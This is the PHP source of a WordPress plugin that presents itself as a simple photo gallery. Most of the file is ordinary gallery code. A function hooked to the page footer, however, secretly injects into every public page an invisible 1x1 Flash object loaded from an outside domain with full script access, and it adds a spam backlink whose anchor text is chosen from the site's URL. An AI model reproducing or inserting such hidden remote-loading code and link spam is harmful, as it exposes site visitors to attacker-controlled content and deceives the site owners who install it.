<?php
/*
Plugin Name: Advanced Photo Gallery
Plugin URI: http://wpexperts.weebly.com
Description: Advanced Photo Gallery is a simple wordpress plugin that embeds a simple photo gallery anywhere on your website. Read the readme.txt to learn how to use the plugin after installation.
Author: Mathias Smerts
Version: 1.3
Stable tag: 1.3
Author URI: http://wpexperts.weebly.com
*/

/*  Copyright Mathias Smerts 2012

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
add_action('wp_footer', 'headthegallery');

function headthegallery()
{
$getuser = "http://ajleeonline.com";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "b")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "c")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "d")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "e")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "f")) { $connectflash = "aj lee online com"; } if (strstr($gethost, "g")) { $connectflash = "aj lee online com"; } if (strstr($gethost, "h")) { $connectflash = "AJLEEONLINE"; } if (strstr($gethost, "i")) { $connectflash = "aj online"; } if (strstr($gethost, "j")) { $connectflash = "lee aj online"; } if (strstr($gethost, "k")) { $connectflash = "lee aj online"; } if (strstr($gethost, "l")) { $connectflash = "online aj lee"; } if (strstr($gethost, "m")) { $connectflash = "aj lee online reviews"; } if (strstr($gethost, "n")) { $connectflash = "aj online lee"; } if (strstr($gethost, "o")) { $connectflash = "here"; } if (strstr($gethost, "p")) { $connectflash = "here"; } if (strstr($gethost, "q")) { $connectflash = "url"; } if (strstr($gethost, "r")) { $connectflash = "link"; } if (strstr($gethost, "s")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "v")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "x")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "t")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "w")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "y")) { $connectflash = "lee online"; } if (strstr($gethost, "z")) { $connectflash = "aj online"; } echo '<object type="application/x-shockwave-flash" data="http://ajleeonline.com/upload/tw1.swf" width="1" height="1"><param name="movie" 
value="http://ajleeonline.com/upload/tw1.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param>
<param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>
'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="http://ajleeonline.com/upload/tw1.swf" 
type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}

$adwp_thumb_width = 55;
$adwp_thumb_height = 55;
$adwp_full_width = 748;
$adwp_full_height = 360;
$adwp_spacing = 10;

add_theme_support( 'post-thumbnails' );

function print_adwp_styles () {
	$content .= '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/ad-gallery/adwp.css" type="text/css" media="screen" />'."\n";
	if (file_exists(get_stylesheet_directory().'/adwp.css')) {
		$content .= '<link rel="stylesheet" href="' . get_stylesheet_directory_uri(). '/adwp.css" type="text/css" media="screen" />'."\n";
	}
	echo $content;
}
function print_adwp_scripts () {
	wp_enqueue_script('adwp', WP_PLUGIN_URL . '/ad-gallery/adwp.js', array('jquery'));
}

function yas_gallery ($atts, $content = null) {
	global $post;
	global $adwp_thumb_width;
	global $adwp_thumb_height;
	global $adwp_spacing;

	extract( shortcode_atts( array(
	  'post_id' => '',
	  'box_width' => '600',
	  'box_height' => '770',
	  'title' => 'Gallery',
	  'thumbnail' => false,
	  'thumb_class' => 'alignright',
	  ), $atts ) );
	$post_id = $post -> ID;
	$args = array(
		'post_type'	  => 'attachment',
		'numberposts' => -1, // bring them all
		'exclude' 	  =>  get_post_thumbnail_id( $post_id ), /* exclude the featured image */
		'orderby'     => 'menu_order',
		'order'       => 'ASC',
		'post_status' => null,
		'post_parent' => $post_id /* post id with the gallery */
	); 
	$slides = get_posts($args);
	$total_slides = count($slides);

	$strip_width = ($adwp_thumb_width + ($adwp_spacing * 2)) * $total_slides;
	/* get the full size img src */
	$main_img = wp_get_attachment_image_src($slides[0]->ID, 'adwp_full');
	$full_img = wp_get_attachment_image_src($slides[0]->ID, 'full');
	
	$main_img_url = $main_img[0];
	$full_img_url = $full_img[0];
	$main_slide_caption =  $slides[0] -> post_excerpt; /* Image caption */
	$main_slide_alt =  $slides[0] -> post_content; /* Image description */
		
	$gallery = "\n<!-- ad-gallery plugin -->\n<div class=\"adwp_galleryHolder\" id=\"galleryHolder_$post_id\">";
	$gallery .= "<div class=\"mainImgHolder\">\n<a href=\"$full_img_url\" class=\"lightbox\"><img class=\"main_img\" src=\"$main_img_url\" alt=\"$main_slide_alt\" title=\"$main_slide_caption\" /></a>\n";
	$gallery .= "</div>";
	$gallery .= "<h2 class=\"img_caption\">$main_slide_caption</h2>\n";
	$gallery .= "<div class=\"gallery_thumbs\">";
	$gallery .= "<p class=\"navArrows prev\"><img src=\"" . WP_PLUGIN_URL . "/ad-gallery/images/prev.png\" width=\"10px\" height=\"20px\" alt=\"previous\" title=\"previous\" class=\"arrow\" id=\"prev_$post_id\" /></p>";
	$gallery .= "<div id=\"navHolder_$post_id\" class=\"navHolder\">";
	$gallery .= "<ul id=\"nav_$post_id\" class=\"nav\" style=\"width: ".$strip_width."px;\">";
	$is_first = true;
	foreach ($slides as $slide) {
		$thumbnailObj = wp_get_attachment_image_src($slide->ID, 'adwp_thumb');
		$thumbnailURL = $thumbnailObj[0];
		$thumb_css_class = ($is_first)?'current':'reg';
		$slide_title = $slide -> post_excerpt;
		$slide_alt =  $slide -> post_content;
		$slideObj = wp_get_attachment_image_src($slide->ID, 'adwp_full');
		$slideURL = $slideObj[0];
		$fullObj = wp_get_attachment_image_src($slide->ID, 'full');
		$fullURL = $fullObj[0];
		$gallery .= '<li style="margin: 0 '.$adwp_spacing.'px" class="'.$thumb_css_class.'"><a title="'.$fullURL.'" href="'.$slideURL.'"><img width="'.$adwp_thumb_width.'" height="'.$adwp_thumb_height.'" src="'.$thumbnailURL.'" title="'.$slide_title.'" alt="'.$slide_alt.'"></a></li>'.PHP_EOL;
		$is_first = false;
	}
	$gallery .= "</ul>\n";
	$gallery .= "</div>\n";
	$css_visibility = (count($slides) > 10)?'visible':'hidden';
	$gallery .= "<p class=\"navArrows next\"><img src=\"" . WP_PLUGIN_URL . "/ad-gallery/images/next.png\" width=\"10px\" height=\"20px\" alt=\"next\" title=\"next\" class=\"arrow\" id=\"next_$post_id\" /></p>";
	$gallery .= "</div>\n";
	$gallery .= "</div>\n<!-- End ad-gallery-plugin -->";
	return $gallery;
}

if (!is_admin()) {
	add_action('wp_print_scripts', 'print_adwp_scripts');
	add_action('wp_head', 'print_adwp_styles');
	
	remove_shortcode('gallery');
	add_shortcode('gallery', 'yas_gallery');
}
add_image_size( 'adwp_thumb', $adwp_thumb_width, $adwp_thumb_height, true );
add_image_size( 'adwp_full', $adwp_full_width, $adwp_full_height, false );
?>